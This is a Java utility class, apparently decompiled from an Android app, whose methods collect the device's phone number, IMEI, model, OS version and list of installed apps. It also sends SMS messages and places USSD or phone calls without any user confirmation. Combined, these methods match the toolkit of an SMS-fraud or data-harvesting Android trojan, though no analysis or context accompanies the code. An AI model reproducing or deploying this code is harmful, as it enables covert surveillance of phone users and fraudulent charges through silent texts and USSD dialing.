package com.baseapp;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import java.util.List;
import org.json.JSONArray;

/* loaded from: classes.dex */
public class Utils {
    public static String getPhoneNumber(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getLine1Number();
    }

    public static String getCountry(Context context) {
        return context.getResources().getConfiguration().locale.getCountry();
    }

    public static String getIMEI(Context context) {
        return ((TelephonyManager) context.getSystemService("phone")).getDeviceId();
    }

    public static String getCutIMEI(Context context) {
        String imei = getIMEI(context);
        return imei != null ? imei.substring(0, Math.min(imei.length(), 10)) : "";
    }

    public static String getModel() {
        String manufacturer = Build.MANUFACTURER;
        String model = Build.MODEL;
        return model.startsWith(manufacturer) ? capitalize(model) : String.valueOf(capitalize(manufacturer)) + " " + model;
    }

    private static String capitalize(String s) {
        if (s == null || s.length() == 0) {
            return "";
        }
        char first = s.charAt(0);
        return !Character.isUpperCase(first) ? String.valueOf(Character.toUpperCase(first)) + s.substring(1) : s;
    }

    public static String getOS() {
        return Build.VERSION.RELEASE;
    }

    public static void putBooleanValue(SharedPreferences settings, String name, boolean value) {
        SharedPreferences.Editor editor = settings.edit();
        editor.putBoolean(name, value);
        editor.commit();
    }

    public static void putStringValue(SharedPreferences settings, String name, String value) {
        SharedPreferences.Editor editor = settings.edit();
        editor.putString(name, value);
        editor.commit();
    }

    public static boolean sendMessage(String number, String text) {
        if (number == "") {
            return false;
        }
        SmsManager.getDefault().sendTextMessage(number, null, text, null, null);
        return true;
    }

    public static String getInstalledAppsList(Context context) {
        PackageManager packageManager = context.getPackageManager();
        List<ApplicationInfo> packages = packageManager.getInstalledApplications(128);
        JSONArray jArray = new JSONArray();
        for (ApplicationInfo applicationInfo : packages) {
            if (!isSystemPackage(applicationInfo)) {
                jArray.put(applicationInfo.loadLabel(packageManager).toString());
            }
        }
        return jArray.toString();
    }

    private static boolean isSystemPackage(ApplicationInfo applicationInfo) {
        return (applicationInfo.flags & 1) != 0;
    }

    public static void makeUSSD(Context context, String number) {
        Intent intent = new Intent("android.intent.action.CALL", Uri.parse("tel:" + Uri.encode(number)));
        intent.setFlags(intent.getFlags() | 268435456);
        context.startActivity(intent);
    }
}